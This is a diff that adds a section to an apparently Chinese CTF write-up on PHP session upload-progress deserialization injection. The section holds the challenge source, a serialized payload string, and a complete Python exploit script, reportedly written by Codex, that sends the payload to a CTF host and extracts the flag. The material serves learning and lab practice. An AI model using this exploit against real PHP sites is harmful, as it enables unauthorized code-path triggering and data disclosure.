@@ -1811,21 +1811,184 @@ if __name__ == "__main__":
 
 
 
-## 8.
+## 8.Session Upload Progress控制
+
+```
+<?php
+highlight_file(__FILE__);
+ini_set('session.serialize_handler', 'php');
+session_start();
+
+class test{
+    public $name;
+    function __destruct(){
+        if($this->name=='flag'){
+            include('flag.php');
+            echo $flag;
+        }
+        else{
+            phpinfo();
+        }
+    }
+}
+```
+
+我去，我被ai吓到了。
+
+这个出来，我感觉也就是session的恶意注入，利用解析不同。
+
+但是没接口给我反序列化啊，我扫了好几次，都找不到接口能让我的数据反序列化的点啊。
+
+> https://cloud.tencent.com/developer/article/2035863
+
+其实探姬师傅的题目名是有提示这个知识点的。
+
+简单来讲，就是说 **5.4** 版本之后的php多了一个上传文件的监测器 Session Upload Progress  ，它的信息存放在  `session` 中，然后我们可以通过控制这个监测器对一部分的 `session` 进行自定义的字段。
+
+`upload_progress_a|O:4:"test":1:{s:4:"name";s:4:"flag";}x|a:6:{...上传进度数组...}`
+
+对这个监测器进行这样的转化，使得有一段序列化数据能够被反序列化完成对于魔术方法的触发，得到flag。
+
+但是其实看了知识点也不懂啊，我要怎么控制这个监测器呢。
+
+然后我就暴力扔给codex。
+
+它怎么做的？
+硬发包，然后发现：
+
+```
+靶机接受上传（`multipart/form-data`），PHP 会处理 `PHP_SESSION_UPLOAD_PROGRESS` 并把其值拼进 session key。
+```
+
+也就是curl发送数据流，看回显看见的，说实话，我怎么能知道这个点，我到现在都不清楚一共有几种发送的数据流。
+
+![image-20260414213057584](/images/image-20260414213057584.png)
+
+看到这个就一辈子了，这就是ai的实力，写的脚本肉眼可见的复杂。
+
+```
+
+import argparse
+import re
+import sys
+import uuid
+from urllib import request
+from urllib.parse import urlparse
+
+DEFAULT_URL = "http://80-edea7259-899b-45a2-8712-f1ec19640939.challenge.ctfplus.cn/"
+PAYLOAD = 'a|O:4:"test":1:{s:4:"name";s:4:"flag";}x'
+FLAG_RE = re.compile(r"[A-Za-z][A-Za-z0-9_]*\{[^{}\r\n<>]{4,200}\}")
 
 
+def normalize_url(url: str) -> str:
+    url = url.strip()
+    if not url.startswith(("http://", "https://")):
+        url = "http://" + url
+    if not url.endswith("/"):
+        url += "/"
+    return url
 
 
+def make_multipart(fields, file_field_name="file", filename="a.txt", file_bytes=b"12345"):
+    boundary = "----CodexBoundary" + uuid.uuid4().hex
+    lines = []
+    for k, v in fields.items():
+        lines.append(f"--{boundary}\r\n".encode())
+        lines.append(
+            f'Content-Disposition: form-data; name="{k}"\r\n\r\n{v}\r\n'.encode()
+        )
+
+    lines.append(f"--{boundary}\r\n".encode())
+    lines.append(
+        (
+            f'Content-Disposition: form-data; name="{file_field_name}"; '
+            f'filename="{filename}"\r\n'
+            "Content-Type: application/octet-stream\r\n\r\n"
+        ).encode()
+    )
+    lines.append(file_bytes)
+    lines.append(b"\r\n")
+    lines.append(f"--{boundary}--\r\n".encode())
+
+    body = b"".join(lines)
+    content_type = f"multipart/form-data; boundary={boundary}"
+    return body, content_type
 
 
+def http_post(url, sid, payload, timeout=10):
+    body, content_type = make_multipart({"PHP_SESSION_UPLOAD_PROGRESS": payload})
+    req = request.Request(url=url, data=body, method="POST")
+    req.add_header("Content-Type", content_type)
+    req.add_header("Cookie", f"PHPSESSID={sid}")
+    req.add_header("Connection", "close")
+    with request.urlopen(req, timeout=timeout) as resp:
+        return resp.read().decode("utf-8", errors="ignore")
 
 
+def http_get(url, sid, timeout=10):
+    req = request.Request(url=url, method="GET")
+    req.add_header("Cookie", f"PHPSESSID={sid}")
+    req.add_header("Connection", "close")
+    with request.urlopen(req, timeout=timeout) as resp:
+        return resp.read().decode("utf-8", errors="ignore")
 
 
+def find_flag(text: str):
+    m = FLAG_RE.search(text)
+    return m.group(0) if m else None
 
 
+def run(target: str):
+    target = normalize_url(target)
+    parsed = urlparse(target)
+    if not parsed.netloc:
+        raise ValueError(f"invalid target url: {target}")
+
+    sid = "sid" + uuid.uuid4().hex[:12]
+    print(f"[*] target = {target}")
+    print(f"[*] PHPSESSID = {sid}")
+
+    post_html = http_post(target, sid, PAYLOAD)
+    flag = find_flag(post_html)
+    if flag:
+        print(f"[+] FLAG = {flag}")
+        return 0
+
+    get_html = http_get(target, sid)
+    flag = find_flag(get_html)
+    if flag:
+        print(f"[+] FLAG = {flag}")
+        return 0
+
+    print("[-] flag not found")
+    if "Failed to decode session object" in post_html or "Failed to decode session object" in get_html:
+        print("[-] hint: payload may be malformed or filtered")
+    return 1
 
 
+def main():
+    parser = argparse.ArgumentParser(
+        description="Exploit PHP session upload progress injection to trigger test::__destruct()."
+    )
+    parser.add_argument("-u", "--url", default=DEFAULT_URL, help="target base url")
+    args = parser.parse_args()
+
+    try:
+        code = run(args.url)
+    except Exception as exc:
+        print(f"[!] error: {exc}")
+        code = 2
+    sys.exit(code)
+
+
+if __name__ == "__main__":
+    main()
+
+```
+
+这个我也没招了。
+
+学不来的写法，只能放在这里，然后做一个已有做法的参考了。
 
 
 
